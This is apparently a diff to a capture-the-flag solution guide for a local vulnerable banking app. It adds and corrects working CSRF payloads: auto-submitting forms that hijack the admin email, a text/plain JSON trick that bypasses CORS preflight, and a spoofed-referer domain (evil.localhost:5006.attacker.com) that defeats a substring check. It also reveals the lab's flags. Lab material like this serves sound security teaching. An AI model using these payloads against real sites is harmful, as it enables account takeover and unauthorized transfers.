@@ -22,11 +22,16 @@ Flag: FLAG{csrf_js0n_byp4ss}
   The /api/settings endpoint accepts email changes without CSRF tokens.
   It also accepts Content-Type: text/plain (bypasses preflight).
 
+  The text/plain form trick: when a form submits with enctype=text/plain,
+  the body is "name=value". We craft the name and value so the resulting
+  body is valid JSON: {"email":"hacked@evil.com","x":"="}
+
   curl -X POST http://localhost:5006/bot2 \
     -H "Content-Type: application/json" \
-    -d '{"html": "<form action=\"http://localhost:5006/api/settings\" method=\"POST\" enctype=\"text/plain\"><input name=\"{\\\"email\\\":\\\"hacked@evil.com\\\",\\\"x\" value=\"}\" type=\"hidden\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
+    -d '{"html": "<form action=\"http://localhost:5006/api/settings\" method=\"POST\" enctype=\"text/plain\"><input name=\"{\\\"email\\\":\\\"hacked@evil.com\\\",\\\"x\\\":\\\"\" value=\"\\\"}\" type=\"hidden\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
 
   When admin's email changes from admin@neonbank.net, the flag is returned.
+  POST /reset to restore state between attempts.
 
 -------------------------------------------------------------------------------
 
@@ -38,11 +43,16 @@ Flag: FLAG{csrf_r3f3r3r_3v4d3}
 
   curl -X POST http://localhost:5006/bot3 \
     -H "Content-Type: application/json" \
-    -d '{"html": "<form action=\"http://localhost:5006/transfer-protected\" method=\"POST\"><input name=\"to_user\" value=\"hacker\"><input name=\"amount\" value=\"1000\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
+    -d '{"html": "<form action=\"http://localhost:5006/transfer-protected\" method=\"POST\"><input name=\"to_user\" value=\"hacker\"><input name=\"amount\" value=\"1000\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>", "referer": "http://evil.localhost:5006.attacker.com/exploit.html"}'
 
-  The bot's referer naturally contains "localhost:5006" since it uses
-  Flask's test client. In a real scenario, host the page on a domain
-  like http://evil.localhost:5006.attacker.com/exploit.html
+  NOTE: The bot3 endpoint accepts a "referer" parameter to simulate the
+  attacker's spoofed referer. The referer must contain "localhost:5006"
+  as a substring (the flaw). Without the referer param, the bot uses a
+  default referer that fails the check.
+
+  In a real scenario, the attacker hosts their page on a domain like
+  http://evil.localhost:5006.attacker.com/exploit.html — the substring
+  "localhost:5006" appears in the domain, passing the flawed check.
 
 -------------------------------------------------------------------------------
 
@@ -75,7 +85,11 @@ Flag: FLAG{csrf_c0rs_m1sc0nf1g}
 
   curl -X POST http://localhost:5006/bot5 \
     -H "Content-Type: application/json" \
-    -d '{"html": "<form action=\"http://localhost:5006/api/transfer\" method=\"POST\" enctype=\"text/plain\"><input name=\"{\\\"to_user\\\":\\\"hacker\\\",\\\"amount\\\":5000,\\\"x\" value=\"}\" type=\"hidden\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
+    -d '{"html": "<form action=\"http://localhost:5006/api/transfer\" method=\"POST\" enctype=\"text/plain\"><input name=\"{\\\"to_user\\\":\\\"hacker\\\",\\\"amount\\\":5000,\\\"x\\\":\\\"\" value=\"\\\"}\" type=\"hidden\"><input type=\"submit\"></form><script>document.forms[0].submit()</script>"}'
+
+  The text/plain trick makes the form body valid JSON:
+    {"to_user":"hacker","amount":5000,"x":"="}
+  The server parses this as JSON and processes the transfer.
 
   POST /reset to restore the database between attempts.
 
